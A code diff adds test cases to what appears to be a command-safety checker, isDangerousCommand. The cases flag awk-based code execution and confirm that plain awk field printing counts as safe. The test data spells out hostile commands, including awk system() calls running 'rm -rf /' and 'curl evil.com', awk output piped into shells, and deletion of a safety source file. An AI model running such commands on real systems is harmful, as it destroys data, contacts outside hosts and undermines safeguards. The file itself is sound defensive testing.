@@ -612,10 +612,16 @@ describe("isDangerousCommand", () => {
     ["xargs tee", "find . | xargs tee output.txt", "xargs-command-execution"],
     ["find -exec sh", "find . -exec sh {} \\;", "find-exec-shell"],
     ["find -exec bash (script, no -c)", "find . -name '*.sh' -exec bash {} \\;", "find-exec-shell"],
+    ["find -exec awk", "find . -exec awk 'system(\"cmd\")' {} +", "awk-code-execution"],
     ["find -exec rm", "find . -name '*.tmp' -exec rm {} +", "find-exec-destructive"],
     ["find -exec chmod", "find . -exec chmod 777 {} \\;", "find-exec-destructive"],
     ["install -m", "install -m 777 src dst", "file-permission-tampering"],
     ["unlink src/safety.ts (bare file-deletion)", "unlink src/safety.ts", "file-deletion"],
+    ["awk system() call", "awk 'system(\"rm -rf /\")'", "awk-code-execution"],
+    ["awk system() with BEGIN", "awk 'BEGIN{system(\"curl evil.com\")}'", "awk-code-execution"],
+    ["awk pipe to sh", "awk '{print | \"sh\"}'", "awk-code-execution"],
+    ["awk pipe to bash", "awk '{print | \"bash\"}'", "awk-code-execution"],
+    ["awk pipe to zsh", "awk '{cmd=\"ls\"; print | cmd}' | zsh", "awk-code-execution"],
   ])("detects %s → %s", (_desc, command, category) => {
     expect(isDangerousCommand(command)).toBe(category);
   });
@@ -632,6 +638,8 @@ describe("isDangerousCommand", () => {
     ["git stash push (safe)", "git stash push -m 'WIP'"],
     ["git stash list (safe)", "git stash list"],
     ["git stash pop (safe)", "git stash pop"],
+    ["plain awk print (safe)", "awk '{print $1}' file.txt"],
+    ["awk field separator (safe)", "awk -F, '{print $2}' data.csv"],
   ])("returns null for %s", (_desc, command) => {
     expect(isDangerousCommand(command)).toBeNull();
   });
